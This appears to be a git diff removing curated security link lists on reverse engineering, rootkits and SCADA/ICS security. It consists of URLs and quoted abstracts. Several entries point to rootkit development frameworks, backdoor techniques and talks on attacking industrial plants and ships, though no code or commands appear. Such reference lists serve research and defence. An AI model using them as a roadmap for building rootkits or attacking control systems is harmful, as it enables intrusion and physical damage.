-	* [Byteweight: Learning to Recognize Functions in Binary Code](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-bao.pdf)
-	* [Memalyze: Dynamic Analysis of Memory Access Behavior in Software](http://uninformed.org/?v=all&a=31&t=sumry)
-		* This paper describes strategies for dynamically analyzing an application's memory access behavior. These strategies make it possible to detect when a read or write is about to occur at a given location in memory while an application is executing. An application's memory access behavior can provide additional insight into its behavior. For example, it may be able to provide an idea of how data propagates throughout the address space. Three individual strategies which can be used to intercept memory accesses are described in this paper. Each strategy makes use of a unique method of intercepting memory accesses. These methods include the use of Dynamic Binary Instrumentation (DBI), x86 hardware paging features, and x86 segmentation features. A detailed description of the design and implementation of these strategies for 32-bit versions of Windows is given. Potential uses for these analysis techniques are described in detail.
-	* [How to Grow a TREE from CBASS - Interactive Binary Analysis for  Security Professionals](https://media.blackhat.com/us-13/US-13-Li-How-to-Grow-a-TREE-Slides.pdf)
-* File Formats
-	* [Reversing Monkey](http://cheeky4n6monkey.blogspot.com/2015/02/reversing-monkey.html?m=1)
-		* When trying to recover/carve deleted data, some reverse engineering of the file format may be required. Without knowing how the data is stored, we cannot recover the data of interest - be it timestamps, messages, images, video or another type of data. This quick blog post is intended to give some basic tips that have been observed during monkey's latest travels into reverse engineering of file formats. It was done partly as a memory aid/thinking exercise but hopefully other monkeys will find it useful. This post assumes there's no obfuscation/encryption applied to the file and it does not cover reverse engineering malware exes (which is another kettle of bananas).
-	* [How to RE data files?](https://www.reddit.com/r/ReverseEngineering/comments/l8ac0/how_to_re_data_files/)
-* Firmware
-	* [Reverse Engineering Firmware Primer](https://wiki.securityweekly.com/Reverse_Engineering_Firmware_Primer)
-	* [The Empire Strikes Back Apple – how your Mac firmware security is completely broken](https://reverse.put.as/2015/05/29/the-empire-strikes-back-apple-how-your-mac-firmware-security-is-completely-broken/)
-	* [Hacking Linksys E4200v2 firmware](https://blog.bramp.net/post/2012/01/24/hacking-linksys-e4200v2-firmware/)
-	* [Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...)](https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html)
-	* [Reverse Engineering Qualcomm Baseband](http://events.ccc.de/congress/2011/Fahrplan/attachments/2022_11-ccc-qcombbdbg.pdf)
-* General
-	* [Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
-	* [Getting access to your own Fitbit data](https://www.cs.ru.nl/bachelorscripties/2016/Maarten_Schellevis___4142616___Getting_access_to_your_own_Fitbit_data.pdf)
-		* This study investigates the possibility of getting direct access to one’s own data, as recorded by a Fitbit Charge HR activity tracker, without going through the Fitbit servers. We captured the firmware image of the Fitbit Charge HR during a firmware update. By analyzing this firmware image we were able to reverse-engineer the cryptographic primitives used by the Fitbit Charge HR activity tracker and recover the authentication  protocol. We obtained the cryptographic key that is used in the authentication protocol from the Fitbit Android application. We located a backdoor in version 18.102 of the firmware by comparing it with the latest version of the firmware (18.122). In the latest version of the firmware the backdoor was removed. This backdoor was used to extract the device specific encryption key from the memory of the tracker. While we have not implemented this last step in practice, the device specific encryption key can be used by a Fitbit Charge HR user to obtain his/her fitness data directly from the device.
-	* [Screwdriving. Locating and exploiting smart adult toys](https://www.pentestpartners.com/security-blog/screwdriving-locating-and-exploiting-smart-adult-toys/)
-	* [Hacking travel routers  like it’s 1999](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Mikhail-Sosonkin-Hacking-Travel-Routers-Like-1999.pdf)
-	* [Reverse Engineering IoT Devices](https://iayanpahwa.github.io/Reverse-Engineering-IoT-Devices/)
-	* [How I Reverse Engineered and Exploited a Smart Massager](https://medium.com/@arunmag/how-i-reverse-engineered-and-exploited-a-smart-massager-ee7c9f21bf33)
-	* [Make Confide great again? No, we cannot](http://blog.quarkslab.com/make-confide-great-again-no-we-cannot.html)
-		* RE'ing an electron based "secure communications" app
-	* [The Three Billion Dollar App - Vladimir Wolstencroft -Troopers14](https://www.youtube.com/watch?v=5Duc-uUFzoU)
-		* Talk about reverse engineering SnapChat and Wickr Messaging apps.
-	* [A Practical-Time Attack on the A5/3 Cryptosystem Used in Third Generation GSM Telephony](https://eprint.iacr.org/2010/013)
-		* Abstract: The privacy of most GSM phone conversations is currently protected by the 20+ years old A5/1 and A5/2 stream ciphers, which were repeatedly shown to be cryptographically weak. They will soon be replaced in third generation networks by a new A5/3 block cipher called KASUMI, which is a modified version of the MISTY cryptosystem. In this paper we describe a new type of attack called a sandwich attack, and use it to construct a simple distinguisher for 7 of the 8 rounds of KASUMI with an amazingly high probability of $2^{ -14}$. By using this distinguisher and analyzing the single remaining round, we can derive the complete 128 bit key of the full KASUMI by using only 4 related keys, $2^{26}$ data, $2^{30}$ bytes of memory, and $2^{32}$ time. These complexities are so small that we have actually simulated the attack in less than two hours on a single PC, and experimentally verified its correctness and complexity. Interestingly, neither our technique nor any other published attack can break MISTY in less than the $2^{128}$ complexity of exhaustive search, which indicates that the changes made by the GSM Association in moving from MISTY to KASUMI resulted in a much weaker cryptosystem.
-* OS X
-	* [Reverse Engineering Mac OS X](http://reverse.put.as/papers/)
-		* Excellent source of papers from 2003-2013 all with a focus on reversing either iOS or OS X.
-* Packers
-	* [A Brief Examination of Hacking Team’s Crypter: core-packer.](http://ethanheilman.tumblr.com/post/128708937890/a-brief-examination-of-hacking-teams-crypter)
-	* [The Art of Unpacking - Paper](https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf)
-		* Abstract: The main purpose of this paper is to present anti-reversing techniques employed by executable packers/protectors and also discusses techniques and publicly available tools that can be used to bypass or disable this protections. This information will allow researchers, especially, malcode analysts to identify these techniques when utilized by packed malicious code, and then be able decide the next move when these anti-reversing techniques impede successful analysis. As a secondary purpose, the information presented can also be used by researchers that are planning to add some level of protection in their software by slowing down reversers from analyzing their protected code, but of course, nothing will stop a skilled, informed, and determined reverser
-	* [Paper on Manual unpacking of UPX packed executable using Ollydbg and Importrec](http://www.iosrjournals.org/iosr-jce/papers/Vol16-issue1/Version-1/L016117177.pdf)
-* PDFs
-	* [Advanced PDF Tricks - Ange Albertini, Kurt Pfeifle - Troopers1](https://www.youtube.com/watch?v=k9g9jZdjRcE)
-		* This session is NOT about analyzing exploits but about learning to manipulate PDF contents. Among others:hide/reveal information; remove/add watermark;  just suck less about the format. It's an extended session (2 hours) to leave the audience time to try by themselves actively. The slides' PDF is entirely hand-written to explain clearly each fact, so the presentation slides themselves will be the study materials.
-* Process Hookinng
-	* [Software Hooking methods reveiw(2016)]((https://www.blackhat.com/docs/us-16/materials/us-16-Yavo-Captain-Hook-Pirating-AVs-To-Bypass-Exploit-Mitigations-wp.pdf)
-	* [PolyHook](https://www.codeproject.com/articles/1100579/polyhook-the-cplusplus-x-x-hooking-library)
-* Protocols
-	* [Somfy Smoove Origin RTS Protocol](https://pushstack.wordpress.com/somfy-rts-protocol/)
-		* This document describes the Somfy RTS protocol as used by the “Somfy Smoove Origin RTS”. Most information in this document is based on passive observation of the data send by the Smoove Origin RTS remote, and thus can be inaccurate or incorrect!
-	* [Reverse Engineering The eQSO Protocol](https://gist.github.com/anonymous/7a9d713e61ba990a3a17)
-		* Today I reverse engineered the eQSO protocol. If you didn't know, eQSO is a small program that allows radio amateurs to talk to each other online. Sadly this program isn't as popular as it used to be (Well, neither is the radio).
-	* [Cyber Necromancy - Reverse engineering dead protocols - Defcamp 2014 ](https://www.youtube.com/watch?v=G0v2FO2Ru0w&index=6&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
-	* [Reverse Engineering of Proprietary Protocols, Tools and Techniques - Rob Savoye - FOSDEM 2009 ](https://www.youtube.com/watch?v=t3s-mG5yUjY)
-		* This talk is about reverse engineering a proprietary network protocol, and then creating my own implementation. The talk will cover the tools used to take binary data apart, capture the data, and techniques I use for decoding unknown formats. The protocol covered is the RTMP protocol used by Adobe flash, and this new implementation is part of the Gnash project.
-	* [Netzob](http://www.netzob.org/)
-		* Originaly, the development of Netzob has been initiated to support security auditors and evaluators in their activities of modeling and simulating undocumented protocols. The tool has then been extended to allow smart fuzzing of unknown protocol. 
-	* [Netzob Documentation](http://netzob.readthedocs.org/en/latest/overview/index.html)
-* Satellites
-	* [SATCOM Terminals Hacking by Air, Sea, and Land - Black Hat USA 2014](https://www.youtube.com/watch?v=tRHDuT__GoM)
-
-* Windows
-	* [Windows for Reverse Engineers](http://www.cse.tkk.fi/fi/opinnot/T-110.6220/2014_Reverse_Engineering_Malware_AND_Mobile_Platform_Security_AND_Software_Security/luennot-files/T1106220.pdf)
-	* [Introduction to Reverse Engineering Win32 Applications](http://uninformed.org/?v=all&a=7&t=sumry)
-		* During the course of this paper the reader will be (re)introduced to many concepts and tools essential to understanding and controlling native Win32 applications through the eyes of Windows Debugger (WinDBG). Throughout, WinMine will be utilized as a vehicle to deliver and demonstrate the functionality provided by WinDBG and how this functionality can be harnessed to aid the reader in reverse engineering native Win32 applications. Topics covered include an introductory look at IA-32 assembly, register significance, memory protection, stack usage, various WinDBG commands, call stacks, endianness, and portions of the Windows API. Knowledge gleaned will be used to develop an application designed to reveal and/or remove bombs from the WinMine playing grid. 
-	* [Reverse Engineering Windows AFD.sys](https://recon.cx/2015/slides/recon2015-20-steven-vittitoe-Reverse-Engineering-Windows-AFD-sys.pdf)
-	* [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
-		* "Event Tracing for Windows, (ETW), has been around for quite a while now as it was introduced in Windows 2000. It's basically instrumented logging that describes what a component is doing. Conceptually, it’s something like the proverbial printf("here1") concept used by programmers, but it is present in retail builds. When you enable logging in a component the result is an ETL (Event Trace Log) file. What’s new is that that Network Monitor can read any ETL file. And with the supplied parsers many network oriented ETW providers can be decoded."
-	* [Improving Automated Analysis of Windows x64 Binaries](http://uninformed.org/?v=all&a=18&t=sumry)
-		* As Windows x64 becomes a more prominent platform, it will become necessary to develop techniques that improve the binary analysis process. In particular, automated techniques that can be performed prior to doing code or data flow analysis can be useful in getting a better understanding for how a binary operates. To that point, this paper gives a brief explanation of some of the changes that have been made to support Windows x64 binaries. From there, a few basic techniques are illustrated that can be used to improve the process of identifying functions, annotating their stack frames, and describing their exception handler relationships. Source code to an example IDA plugin is also included that shows how these techniques can be implemented. 
-	* [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
-		* Since the early 2000's Microsoft has distributed patches on the second Tuesday of each month. Bad guys, good guys, and many in-between compare the newly released patches to the unpatched version of the files to identify the security fixes. Many organizations take weeks to patch and the faster someone can reverse engineer the patches and get a working exploit written, the more valuable it is as an attack vector. Analysis also allows a researcher to identify common ways that Microsoft fixes bugs which can be used to find 0-days. Microsoft has recently moved to mandatory cumulative patches which introduces complexity in extracting patches for analysis. Join me in this presentation while I demonstrate the analysis of various patches and exploits, as well as the best-known method for modern patch extraction.
-* Wireless
-	* [Reverse engineering radio weather station](http://blog.atx.name/reverse-engineering-radio-weather-station/)
-	* [You can ring my bell! Adventures in sub-GHz RF land…](http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html)
-	* [Reverse engineering walk through; guy REs alarm system from shelf to replay](https://www.reddit.com/r/ReverseEngineering/comments/1hb7oy/a_series_about_basics_of_hardware_reverse/)
-		* [Part 1:](http://cybergibbons.com/uncategorized/)reverse-engineering-a-wireless-burglar-alarm-system-part-1/
-		* [Part 2:](http://cybergibbons.com/uncategorized/)reverse-engineering-a-wireless-burglar-alarm-part-2/)
-		* [Part 3:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-3/)
-		* [Part 4:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-4/)
-		* [Part 5:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-5/)
-		* [Part 6:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-6/)
-		* [Part 7:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-7/)
-		* [Part 8:](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-8/)
-	* [Blackbox Reversing an Electric Skateboard Wireless Protocol ](https://blog.lacklustre.net/posts/Blackbox_Reversing_an_Electric_Skateboard_Wireless_Protocol/)
-	* [Reverse Engineering a 433MHz Motorised Blind RF Protocol](https://nickwhyte.com/post/2017/reversing-433mhz-raex-motorised-rf-blinds/)
-	* [Flipping Bits and Opening Doors: Reverse Engineering the Linear Wireless Security DX Protocol](https://duo.com/blog/flipping-bits-and-opening-doors-reverse-engineering-the-linear-wireless-security-dx-protocol)
diff --git a/Draft/Rootkits.md b/Draft/Rootkits.md
deleted file mode 100755
index 7134d82..0000000
--- a/Draft/Rootkits.md
+++ /dev/null
@@ -1,183 +0,0 @@
-## Rootkits
-
-
-
-
-
-### TOC
-
-* [Cull](#cull)
-* [Developing](#dev)
-* [Identifying/Defending Against](#id)
-* [Talks/Videos](#talks)
-* [Writeups](#writeups)
-* [Papers](#papers)
-* [Tools](#tools)
-
-
-### Sort
-
-[Homesite](https://trmm.net/EFI)
-
-[Talk at CCC31](https://www.youtube.com/watch?v=5BrdX7VdOr0)
-
-
-
-##### End Sort
-
-
-
-
-
-
-
------------------
-### <a name="dev">Developing</a>
-[Android Rootkit](https://github.com/hiteshd/Android-Rootkit)
-
-[Masochist](https://github.com/squiffy/Masochist)
-* Masochist is a framework for creating XNU based rootkits. Very useful in OS X and iOS security research.
-
-[Using Kernel Rootkits to conceal infected MBR](https://github.com/MalwareTech/FakeMBR/)
-
-[Hypervisor](https://github.com/ainfosec/more)
-
-[Suterusu](https://github.com/mncoppola/suterusu)
-
-Windows Rootkits(excellent writeup/introduction to windows rootkits)
-* [Part 1](http://www.programdevelop.com/5408113/)
-* [Part 2](http://www.programdevelop.com/5409574/)
-* [Part 3](http://www.programdevelop.com/5408212/)
-
-[Crafting Mac OS Rootkits](https://www.zdziarski.com/blog/wp-content/uploads/2017/02/Crafting-macOS-Root-Kits.pdf)
-
-[WindowsRegistryRootkit](https://github.com/Cr4sh/WindowsRegistryRootkit)
-* Kernel rootkit, that lives inside the Windows registry value data. By Oleksiuk Dmytro (aka Cr4sh) 
-* Rootkit uses the zero day vulnerability in win32k.sys (buffer overflow in function win32k!bInitializeEUDC()) to get the execution at the OS startup.
-
-
-
------------------
-### <a name="id">Identifiying/Defending Against</a>
-
-[Killing Rootkits](http://blog.ioactive.com/2014/09/killing-rootkit.html)
-
-[Killing Rootkits](http://blog.ioactive.com/2014/09/killing-rootkit.html)
-
-
-
-
-
------------------
-###<a name="talks">Talks/Videos</a>
-[BoutiqueKit: Playing WarGames with Expensive Rootkits and Malware- Defcon 21](https://www.youtube.com/watch?v=gKUleWyfut0)
-
-
-[Persistent, Stealthy, Remote-controlled Dedicated Hardware Malware [30c3]](https://www.youtube.com/watch?v=Ck8bIjAUJgE)
-
-[Intel Management Engine Secrets by Igor Skochinsky](https://www.youtube.com/watch?v=Y2_-VXz9E-w)
-
-[MoRE Shadow Walker : TLB - splitting on Modern x86](https://www.youtube.com/watch?v=XU1uNGZ7HnY)
-* This presentation provides a cohesive overview of the work performed by AIS, Inc. on the DARPA CFT MoRE effort. MoRE was a 4-month effort which examined the feasibility of utilizing TLB splitting as a mechanism for periodic measurement of dynamically changing binaries. The effort created a proof-of-concept system to split the TLB for target applications, allowing dynamic applications to be measured and can detect code corruption with low performance overhead.
-
-[How Many Million BIOSes Would you Like to Infect?](http://conference.hitb.org/hitbsecconf2015ams/sessions/how-many-million-bioses-would-you-like-to-infect/)
-* This talk is going to be all about how the automation of BIOS vulnerability exploitation and leveraging of built-in capabilities can yield highly portable UEFI firmware malware. And how millions of systems will be vulnerable for years, because no one cares enough to patch the BIOS bugs we?ve found.  So you think you?re doing OPSEC right, right? You?re going to crazy lengths to protect yourself, reinstalling your main OS every month, or using a privacy-conscious live DVD like TAILS. Guess what? BIOS malware doesn?t care! BIOS malware doesn?t give a shit
-
-[Measurement of Running Executables](http://vimeo.com/81335517)
-
-[From Kernel to VM](https://www.youtube.com/watch?v=FSw8Ff1SFLM)
-* Description from stormeh on reddit(https://www.reddit.com/r/rootkit/comments/25hsc4/jacob_i_torrey_from_kernel_to_vmm/): Although it's not directly a lecture about rootkit development, the topics discussed are very much of interest: hardware virtualization, page table and TLB manipulation, hypervisors and privilege levels below ring 0, etc. The speaker does also go on to mention how prior rootkits such as Blue Pill and Shadow Walker leveraged these features, as well as defensive technologies such as PaX. 
-* [Slides](http://jacobtorrey.com/VMMLecture.pdf)
-
-[All Your Boot Are Belong To Us - Intel Security](https://cansecwest.com/slides/2014/AllYourBoot_csw14-intel-final.pdf)
-[Concepts for the Steal the Windows Rootkit (The Chameleon Project)Joanna Rutkowska2003](http://repo.hackerzvoice.net/depot_madchat/vxdevl/avtech/Concepts%20for%20the%20Stealth%20Windows%20Rootkit%20%28The%20Chameleon%20Project%29.pdf)\
-
-
-
-
------------------
-###<a name="writeups">Writeups</a>
-[Shadow Walker - Raising the Bar for Rootkit detection - BH 2005](https://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sparks-butler.pdf)
-
-[Rise of the dual architecture usermode rootkit](http://www.malwaretech.com/2013/06/rise-of-dual-architecture-usermode.html)
-
-[Killing the Rootkit - Shane Macaulay](http://blog.ioactive.com/2014/09/killing-rootkit.html)
-* Cross-platform, cross-architecture DKOM detection
-
-[Raising The Bar For Windows Rootkit Detection - Phrack](http://www.phrack.org/issues/63/8.html)
-
-[TLB Synchronization (Split TLB)](http://uninformed.org/index.cgi?v=6&a=1&p=21)
-
-[Komodia Rootkit Writeupn](https://gist.github.com/Wack0/f865ef369eb8c23ee028)
-* Komodia rootkit findings by @TheWack0lian
-
-[Using Kernel Rootkits to conceal infected MBR](http://www.malwaretech.com/2015/01/using-kernel-rootkits-to-conceal.html)
-
-[MoRE Shadow Walker : TLB - splitting on Modern x86](https://www.blackhat.com/docs/us-14/materials/us-14-Torrey-MoRE-Shadow-Walker-The-Progression-Of-TLB-Splitting-On-x86-WP.pdf)
-* MoRE, or Measurement of Running Executables, was a DARPA Cyber Fast Track effort to study the feasibility of utilizi ng x86 translation look - aside buffer (TLB) splitting techniques for realizing periodic measurements of running and dynamically changing applications. It built upon PaX, which used TLB splitting to emulate the no - execute bit and Shadow Walker, a memory hidi ng rootkit ; both designed for earlier processor architectures. MoRE and MoRE Shadow Walker are a defensive TLB splitting system and a prototype memory hiding rootkit for the current Intel i - series processors respectively ? demonstrating the evolution of th e x86 architecture and how its complexity allows software to effect the apparent hardware architecture.
-
-[Smart TV Security - #1984 in 21 st century](https://cansecwest.com/slides/2013/SmartTV%20Security.pdf)
-* This talk is more about security bugs and rootkits than about firmware for TVs. This talk more covers rootkits than security bugs and exploitation thereof, as they?re not different to traditional techniques. This talk is about general security issues of all Smart TV vendors.
-
-[Advanced Bootkit Techniques on Android](http://www.syscan360.org/slides/2014_EN_AdvancedBootkitTechniquesOnAndroid_ChenZhangqiShendi.pdf)
-
-[Analyzing the Jynx rootkit and the LD-Preload technique](http://volatility-labs.blogspot.com/2012/09/movp-24-analyzing-jynx-rootkit-and.html)
-* In this post I will analyze the Jynx rootkit using Volatility?s new Linux features.
-
-[A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers - Filip Wecherowski](http://phrack.org/issues/66/11.html#article)
-* The research provided in this paper describes in details how to reverse engineer and modify System Management Interrupt (SMI) handlers in the BIOS system firmware and how to implement and detect SMM keystroke logger. This work also presents proof of concept code of SMM keystroke logger that uses I/O Trap based keystroke interception and a code for detection of such keystroke logger.
-
-[Revisiting Mac OS X Kernel Rootkits - fG! <phrack@put.as>-](http://phrack.org/issues/69/7.html)
-
-[Android platform based linux kernel rootkit - dong-hoon you](http://www.phrack.org/issues/68/6.html)
-
-[Stealth hooking : Another way to subvert the Windows kernel - mxatone and ivanlef0u](http://phrack.org/issues/65/4.html#article)
-
-[Kernel Rootkit Experiences - stealth](http://phrack.org/issues/61/14.html)
-
-[NTIllusion: A portable Win32 userland rootkit - Kdm](http://phrack.org/issues/62/12.html)
-
-[Linux on-the-fly kernel patching without LKM - sd, devik](http://phrack.org/issues/58/7.html)
-
-
-
-
-
-
-
------------------
-### <a name="papers">Papers</a>
-[A Catalog of Windows Local Kernel-mode Backdoors](http://uninformed.org/?v=all&a=35&t=sumry)
-* This paper presents a detailed catalog of techniques that can be used to create local kernel-mode backdoors on Windows. These techniques include function trampolines, descriptor table hooks, model-specific register hooks, page table modifications, as well as others that have not previously been described. The majority of these techniques have been publicly known far in advance of this paper. However, at the time of this writing, there appears to be no detailed single point of reference for many of them. The intention of this paper is to provide a solid understanding on the subject of local kernel-mode backdoors. This understanding is necessary in order to encourage the thoughtful discussion of potential countermeasures and perceived advancements. In the vein of countermeasures, some additional thoughts are given to the common misconception that PatchGuard, in its current design, can be used to prevent kernel-mode rootkits.
-
-
-
-[Implementation and Implications of a Stealth Hard-Drive Backdoor](https://www.ibr.cs.tu-bs.de/users/kurmus/papers/acsac13.pdf) 
-* Modern workstations and servers implicitly trust hard disks to act as well-behaved block devices. This paper analyzes the catastrophic loss of security that occurs when hard disks are not trustworthy. First, we show that it is possible to compromise the firmware of a commercial over-the-shelf hard drive, by resorting only to public information and reverse engineering. Using such a compromised firmware, we present a stealth rootkit that replaces arbitrary blocks from the disk while they are written, providing a data replacement back- door . The measured performance overhead of the compromised disk drive is less than 1% compared with a normal, non-malicious disk drive. We then demonstrate that a re- mote attacker can even establish a communication channel with a compromised disk to infiltrate commands and to ex-filtrate data. In our example, this channel is established over the Internet to an unmodified web server that relies on the compromised drive for its storage, passing through the original webserver, database server, database storage engine, filesystem driver, and block device driver. Additional experiments, performed in an emulated disk-drive environment, could automatically extract sensitive data such as /etc/shadow (or a secret key file) in less than a minute. This paper claims that the diffculty of implementing such an at- tack is not limited to the area of government cyber-warfare; rather, it is well within the reach of moderately funded criminals, botnet herders and academic researchers.
-
-
-[futo](http://uninformed.org/?v=all&a=17&t=sumry)
-* Since the introduction of FU, the rootkit world has moved away from implementing system hooks to hide their presence. Because of this change in offense, a new defense had to be developed. The new algorithms used by rootkit detectors, such as BlackLight, attempt to find what the rootkit is hiding instead of simply detecting the presence of the rootkit's hooks. This paper will discuss an algorithm that is used by both Blacklight and IceSword to detect hidden processes. This paper will also document current weaknesses in the rootkit detection field and introduce a more complete stealth technique implemented as a prototype in FUTo. 
-
-[Introducing Ring -3 Rootkits](http://invisiblethingslab.com/resources/bh09usa/Ring%20-3%20Rootkits.pdf)
-
-[Pitfalls of virtual machine introspection on modern hardware](https://www.acsac.org/2014/workshops/mmf/Tamas%20Lengyel-Pitfalls%20of%20virtual%20machine%20introspection%20on%20modern%20hardware.pdf)
-
-[Security Evaluation of Intel's Active Management Technology](http://people.kth.se/~maguire/DEGREE-PROJECT-REPORTS/100402-Vassilios_Ververis-with-cover.pdf)
-
-
-### <a name="tools"></a>Tools
-
-[DragonKing Rootkit](https://github.com/mgrube/DragonKing)
-* This is an open source rootkit created for a class taught on Rootkit Design. This rootkit hides by hooking the system call table and using an agent to do interactive manipulation in userland.
-
-[GPU rootkit PoC by Team Jellyfish](https://github.com/x0r1/jellyfish)
-
-
-
-
-
-
-
-
-
diff --git a/Draft/SCADA.md b/Draft/SCADA.md
deleted file mode 100644
index e0a47aa..0000000
--- a/Draft/SCADA.md
+++ /dev/null
@@ -1,100 +0,0 @@
-# SCADA/Industrial Control Systems
-
-
-
-
-### ToC
-
-* [General](#general)
-* [Articles/Blogposts](#articles)
-* [Talks/Presentations](#talks)
-* [Tools](#tools)
-* [Simulators](#sim)
-* [Testing Tools](#test)
-* [Honeypots](#honey)
-
-#### Sort
-
-#### End Sort
-
-
-### <a name="general"></a>General
-General
-
-* General
-	* [Introduction to Attacking ICS/SCADA Systems for Penetration Testers -GDS Sec](http://blog.gdssecurity.com/labs/2017/5/17/introduction-to-attacking-icsscada-systems-for-penetration-t.html)
-	* [Different Type of SCADA](http://scadastrangelove.blogspot.com/2014/10/different-type-of-scada.html)
-	* [awesome-industrial-control-system-security](https://github.com/hslatman/awesome-industrial-control-system-security)
-	* [Cassandra coefficient and ICS cyber – is this why the system is broken](http://www.controlglobal.com/blogs/unfettered/cassandra-coefficient-and-ics-cyber-is-this-why-the-system-is-broken/)
-	* [Remote Physical Damage 101 - Bread and Butter Attacks](https://www.blackhat.com/docs/us-15/materials/us-15-Larsen-Remote-Physical-Damage-101-Bread-And-Butter-Attacks.pdf)
-	* [Sinking container ships by hacking load plan software](https://www.pentestpartners.com/security-blog/sinking-container-ships-by-hacking-load-plan-software/)
-	* [SCADA Strangelove or: How I Learned to Start Worrying and Love Nuclear Plants](https://www.youtube.com/watch?v=o2r7jbwTv6w)
-		* Modern civilization unconditionally depends on information systems. It is paradoxical but true that ICS/SCADA systems are the most insecure systems in the world. From network to application, SCADA is full of configuration issues and vulnerabilities. During our report, we will demonstrate how to obtain full access to a plant via: a sniffer and a packet generator; FTP and Telnet; Metasploit and oslq; a webserver and a browser; About 20 new vulnerabilities in common SCADA systems including Simatic WinCC will be revealed.
-	* [Rocking the Pocket Book: Hacking Chemical Plant for Competition and Extortion - Marina Krotofil - Jason Larsen](https://www.youtube.com/watch?v=AL8L76n0Q9w)
-		* The appeal of hacking a physical process is dreaming about physical damage attacks lighting up the sky in a shower of goodness. Let’s face it, after such elite hacking action nobody is going to let one present it even at a conference like DEF CON. As a poor substitute, this presentation will get as close as using a simulated plant for Vinyl Acetate production for demonstrating a complete attack, from start to end, directed at persistent economic damage to a production site while avoiding attribution of production loss to a cyber-event. Such an attack scenario could be useful to a manufacturer aiming at putting competitors out of business or as a strong argument in an extortion attack. Exploiting physical process is an exotic and hard to develop skill which have so far kept a high barrier to entry. Therefore real-world control system exploitation has remained in the hands of a few. To help the community mastering new skills we have developed „Damn Vulnerable Chemical Process“ – first open source framework for cyber-physical experimentation based on two realistic models of chemical plants. Come to the session and take your first master class on complex physical hacking.
-* EDIFACT
-	* [EDIFACT - Wikipedia](https://en.wikipedia.org/wiki/EDIFACT)
-	* [SMDG.org](http://www.smdg.org/)
-		* SMDG develops and promotes UN/EDIFACT EDI-messages for the Maritime Industry and is an official Global User Group, recognised by the UN/EDIFACT Board. 
-	* [Making prawn espressos, or hacking ships by deciphering BAPLIE EDIFACT messaging](https://www.pentestpartners.com/security-blog/making-prawn-espressos-or-hacking-ships-by-deciphering-baplie-edifact-messaging/)
-	* [BAPLIE](http://www.portofantwerp.com/apcs/en/node/449)
-		* The BAPLIE message is a widely used EDIFACT message in the shipping industry. It is used by and between various parties to advise the exact stowage positions of the cargo on board of an ocean vessel. It is currently chiefly used for container cargo. Besides the container number and the exact position on board, general information regarding the containers is also specified such as weight and hazardous cargo class. 
-
-
-#### Learning
-Educational
-* [Control System Basics](https://www.youtube.com/watch?v=VQLRVjEFRGI)
-* [PLC Training Org](http://plc-training.org/plc-network-to-hmi-scada.html)
-* [Serial Communication RS232 & RS485](https://www.youtube.com/watch?v=2DQdEHvnqvI)
-* [How Ethernet TCP/IP is Used by Industrial Protocols](https://www.youtube.com/watch?v=DL_zIjhCEpU)
-* [SCADA Systems - Utility 101 Session with Rusty Wiliiams](https://www.youtube.com/watch?v=vv2CoTiaWPI)
-* [Control System Lectures - Brian Douglas - youtube channel](https://www.youtube.com/user/ControlLectures/about)
-	* Welcome to Control Systems Lectures!  This collection of videos is intended to supplement a first year controls class, not replace it.  My goal is to take specific concepts in controls and expand on them in order to provide an intuitive understanding which will ultimately make you a better controls engineer.  
-* [plcprofessor - youtube channel](https://www.youtube.com/user/plcprofessor)
-	*  The PLC Professor YouTube Channel is soley dedicated to technical education, specifically industrial control systems and their supporting technologies. The "Complete PLCLearn Series" is comprised of lectures, hands on lab projects and lab project wrap up discussions. The playlists to use for the series are titled "Lectures", "Basics" lab discussions, "Advanced I" lab discussions and "Advanced II" lab discussions. There is also a "Support" playlist for miscellaneous supporting knowledge, "RSLogix5000", "How to Program", as well as many more to come. These lectures and lab projects were developed for actual classroom training and have been improved as hundreds of electricians and engineers completed and commented on the content. 
-* [Damn Vulnerable Chemical Process](https://www.slideshare.net/phdays/damn-vulnerable-chemical-process)
-* [Hacking Chemical Plants for Competition and Extortion - Marina Krotofil - HITBGSEC 2015](https://www.youtube.com/watch?v=0B-sG1rKJ2U)
-
-
-
-
-Modbus
-* [Modbus Stager: Using PLCs as a payload/shellcode distribution system](http://www.shelliscoming.com/2016/12/modbus-stager-using-plcs-as.html)
-* [All You Need to Know About Modbus RTU](https://www.youtube.com/watch?v=OvRD2UvrHjE)
-* [All You need to know about Modbus TCP](https://www.youtube.com/watch?v=E1nsgukeKKA)
-* [Modbus Data structure](https://www.youtube.com/watch?v=8FYFai21JPA)
-
-Tools
-* General Tools
-	* [python-opcua](https://github.com/FreeOpcUa/python-opcua/blob/master/README.md)
-		* OPC UA binary protocol implementation is quasi complete and has been tested against many different OPC UA stacks. API offers both a low level interface to send and receive all UA defined structures and high level classes allowing to write a server or a client in a few lines. It is easy to mix high level objects and low level UA calls in one application.
-	* [UaExpert—A Full-Featured OPC UA Client](https://www.unified-automation.com/products/development-tools/uaexpert.html)
